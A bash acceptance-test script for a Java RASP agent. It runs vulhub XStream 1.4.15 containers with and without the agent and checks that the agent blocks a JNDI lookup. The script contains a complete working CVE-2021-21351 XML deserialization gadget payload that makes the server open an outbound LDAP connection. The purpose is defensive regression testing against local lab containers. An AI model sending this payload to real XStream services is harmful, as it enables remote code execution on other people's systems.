#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_XSTREAM_21351_IMAGE:-vulhub/xstream:1.4.15}"
baseline_name="${OHMYRASP_VULHUB_XSTREAM_21351_BASELINE_NAME:-ohmyrasp-vulhub-xstream21351-baseline}"
protected_name="${OHMYRASP_VULHUB_XSTREAM_21351_PROTECTED_NAME:-ohmyrasp-vulhub-xstream21351-protected}"
baseline_port="${OHMYRASP_VULHUB_XSTREAM_21351_BASELINE_PORT:-19164}"
protected_port="${OHMYRASP_VULHUB_XSTREAM_21351_PROTECTED_PORT:-19166}"
baseline_listener_port="${OHMYRASP_VULHUB_XSTREAM_21351_BASELINE_LISTENER_PORT:-19165}"
protected_listener_port="${OHMYRASP_VULHUB_XSTREAM_21351_PROTECTED_LISTENER_PORT:-19167}"
baseline_dir="logs/vulhub-xstream-1.4.15-java8-baseline"
protected_dir="logs/vulhub-xstream-1.4.15-java8-protected"
protected_log="${protected_dir}/events.jsonl"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_xstream() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status

  for _ in $(seq 1 180); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" == "200" ]] && grep -q 'input your information' "$output"; then
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose XStream demo at ${port}" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected XStream container" >&2
    exit 1
  fi
  if ! grep -q '"jndi_hook":"installed"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2
    echo "missing Java 8 JNDI hook startup marker in protected XStream container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    sed -n '1,160p' "$protected_log" >&2
    echo "protected XStream container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

container_gateway() {
  local name="$1"
  docker exec "$name" sh -c 'ip route' | awk '/default/ {print $3; exit}'
}

start_listener() {
  local port="$1"
  local result="$2"
  local timeout="$3"
  python3 -u - "$port" "$result" "$timeout" <<'PY' &
import pathlib
import socket
import sys

port = int(sys.argv[1])
result = pathlib.Path(sys.argv[2])
timeout = int(sys.argv[3])
result.write_text("WAITING\n")
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.listen(1)
sock.settimeout(timeout)
try:
    conn, addr = sock.accept()
    lines = ["CONNECTED %s:%s" % addr]
    try:
        conn.settimeout(1)
        lines.append("BYTES %r" % conn.recv(64))
    except Exception as exc:
        lines.append("READ_ERROR %s" % exc)
    conn.close()
    result.write_text("\n".join(lines) + "\n")
except Exception as exc:
    result.write_text("TIMEOUT %s\n" % exc)
finally:
    sock.close()
PY
}

write_xstream_payload() {
  local ldap_url="$1"
  local output="$2"

  python3 - "$ldap_url" "$output" <<'PY'
import sys

ldap_url = sys.argv[1]
output = sys.argv[2]
payload = """<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms><null/></m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>LDAP_URL</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl><default/></com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types><class>boolean</class></parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker><nextIsRaw>false</nextIsRaw></m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
""".replace("LDAP_URL", ldap_url)
with open(output, "w", encoding="utf-8") as handle:
    handle.write(payload)
PY
}

send_payload() {
  local port="$1"
  local payload="$2"
  local output="$3"

  curl -sS -o "$output" -w "%{http_code}" \
    -H 'Content-Type: application/xml' \
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for_xstream "$baseline_name" "$baseline_port" "${baseline_dir}/home.response"
wait_for_xstream "$protected_name" "$protected_port" "${protected_dir}/home.response"
expect_protected_startup_without_detection

baseline_gateway="$(container_gateway "$baseline_name")"
baseline_listener="${baseline_dir}/ldap-listener.txt"
baseline_payload="${baseline_dir}/payload.xml"
write_xstream_payload "ldap://${baseline_gateway}:${baseline_listener_port}/x" "$baseline_payload"
start_listener "$baseline_listener_port" "$baseline_listener" 15
baseline_listener_pid=$!
baseline_status="$(send_payload "$baseline_port" "$baseline_payload" "${baseline_dir}/exploit.response")"
wait "$baseline_listener_pid"
if [[ "$baseline_status" == "000" ]]; then
  sed -n '1,120p' "${baseline_dir}/exploit.response" >&2 || true
  echo "baseline XStream CVE-2021-21351 request did not reach the server" >&2
  exit 1
fi
if ! grep -q '^CONNECTED ' "$baseline_listener"; then
  cat "$baseline_listener" >&2 || true
  echo "baseline XStream CVE-2021-21351 did not reach the outbound LDAP listener" >&2
  exit 1
fi

protected_gateway="$(container_gateway "$protected_name")"
protected_listener="${protected_dir}/ldap-listener.txt"
protected_payload="${protected_dir}/payload.xml"
write_xstream_payload "ldap://${protected_gateway}:${protected_listener_port}/x" "$protected_payload"
start_listener "$protected_listener_port" "$protected_listener" 8
protected_listener_pid=$!
protected_status="$(send_payload "$protected_port" "$protected_payload" "${protected_dir}/exploit.response")"
wait "$protected_listener_pid"
if [[ "$protected_status" == "000" ]]; then
  sed -n '1,120p' "${protected_dir}/exploit.response" >&2 || true
  echo "protected XStream CVE-2021-21351 request did not reach the server" >&2
  exit 1
fi
if ! grep -q '^TIMEOUT ' "$protected_listener"; then
  cat "$protected_listener" >&2 || true
  echo "protected XStream CVE-2021-21351 still reached the outbound LDAP listener" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_jndi_remote_lookup".*"action":"block"' "$protected_log"; then
  sed -n '1,200p' "$protected_log" >&2
  echo "missing java8_jndi_remote_lookup block event for XStream CVE-2021-21351" >&2
  exit 1
fi

echo "vulhub XStream CVE-2021-21351 Java8 acceptance passed"
